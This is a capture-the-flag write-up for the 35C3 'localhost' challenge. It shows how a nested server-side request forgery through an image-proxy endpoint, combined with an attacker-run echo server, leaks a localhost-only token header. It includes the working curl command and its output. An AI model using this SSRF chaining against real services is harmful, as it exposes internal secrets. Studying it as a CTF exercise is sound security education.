# Challenge localhost

81 Points

## Challenge

We came up with some ingenious solutions to the problem of password reuse. For users, we don't use password auth but send around mails instead. This works well for humans but not for robots. To make test automation possible, we didn't want to send those mails all the time, so instead we introduced the localhost header. If we send a request to our server from the same host, our state-of-the-art python server sets the localhost header to a secret only known to the server. This is bullet-proof, luckily.

http://35.207.189.79/

Difficulty Estimate: Medium

## Solution

The link points to the paperbots web application. From the source code of the server we learned, that the flag is set with the following method:

```
@app.after_request
def secure(response: Response):
    if not request.path[-3:] in ["jpg", "png", "gif"]:
        response.headers["X-Frame-Options"] = "SAMEORIGIN"
        response.headers["X-Xss-Protection"] = "1; mode=block"
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["Content-Security-Policy"] = "script-src 'self' 'unsafe-inline';"
        response.headers["Referrer-Policy"] = "no-referrer-when-downgrade"
        response.headers["Feature-Policy"] = "geolocation 'self'; midi 'self'; sync-xhr 'self'; microphone 'self'; " \
                                             "camera 'self'; magnetometer 'self'; gyroscope 'self'; speaker 'self'; " \
                                             "fullscreen *; payment 'self'; "
        if request.remote_addr == "127.0.0.1":
            response.headers["X-Localhost-Token"] = LOCALHOST

    return response
```

So we need to create a request with the remote address as localhost and still be able to see the response. Luckily there is an interesting endpoint:

```
# Proxy images to avoid tainted canvases when thumbnailing.
@app.route("/api/proxyimage", methods=["GET"])
def proxyimage():
    url = request.args.get("url", '')
    parsed = parse.urlparse(url, "http")  # type: parse.ParseResult
    if not parsed.netloc:
        parsed = parsed._replace(netloc=request.host)  # type: parse.ParseResult
    url = parsed.geturl()

    resp = requests.get(url)
    if not resp.headers["Content-Type"].startswith("image/"):
        raise Exception("Not a valid image")

    # See https://stackoverflow.com/a/36601467/1345238
    excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
    headers = [(name, value) for (name, value) in resp.raw.headers.items()
               if name.lower() not in excluded_headers]

    response = Response(resp.content, resp.status_code, headers)
    return response

```

Now we can use proxyimage to load other ressources. We could also load the proxy itself :)

But as restriction we can only load "images". We must response with a HTTP header flag starting with "image/". For this we downloaded a simple python echo server and modified it a bit to return everytime the Content-Type: image/png. The script echo.py do the job.


The final request:

```
root@blackbox:# curl -v "http://35.207.189.79/api/proxyimage?url=http://127.0.0.1:8075/api/proxyimage?url=http://151.217.250.118:8080/"
*   Trying 35.207.189.79...
* TCP_NODELAY set
* Connected to 35.207.189.79 (35.207.189.79) port 80 (#0)
> GET /api/proxyimage?url=http://127.0.0.1:8075/api/proxyimage?url=http://151.217.250.118:8080/ HTTP/1.1
> Host: 35.207.189.79
> User-Agent: curl/7.62.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Content-Type: image/png
< Content-Length: 0
< Connection: keep-alive
< Server: BaseHTTP/0.3 Python/2.7.15rc1
< Date: Sat, 29 Dec 2018 11:54:37 GMT
< X-Frame-Options: SAMEORIGIN
< X-Xss-Protection: 1; mode=block
< X-Content-Type-Options: nosniff
< Content-Security-Policy: script-src 'self' 'unsafe-inline';
< Referrer-Policy: no-referrer-when-downgrade
< Feature-Policy: geolocation 'self'; midi 'self'; sync-xhr 'self'; microphone 'self'; camera 'self'; magnetometer 'self'; gyroscope 'self'; speaker 'self'; fullscreen *; payment 'self';
< X-Localhost-Token: 35C3_THIS_HOST_IS_YOUR_HOST_THIS_HOST_IS_LOCAL_HOST
< 
* Connection #0 to host 35.207.189.79 left intact

```

The token can be found as HTTP header :fire:
